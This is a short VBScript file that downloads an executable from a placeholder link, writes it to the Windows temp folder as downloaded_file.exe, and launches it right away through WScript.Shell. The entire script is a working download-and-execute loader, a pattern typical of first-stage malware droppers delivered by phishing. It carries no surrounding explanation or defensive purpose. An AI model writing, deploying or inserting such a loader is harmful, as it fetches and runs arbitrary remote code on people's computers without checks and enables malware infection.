Dim url, savePath, objHTTP, objStream, objShell

url = "http://127.0.0.1:5000/download/08Bg9KancA3-w7W9t0z5cKW3g7u__cAb-r1OumUDKcg"  ' <-- Replace with your direct link
savePath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\downloaded_file.exe"

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "GET", url, False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile savePath, 2
    objStream.Close

    Set objShell = CreateObject("WScript.Shell")
    objShell.Run Chr(34) & savePath & Chr(34), 1, False
Else
    MsgBox "HTTP error: " & objHTTP.Status
End If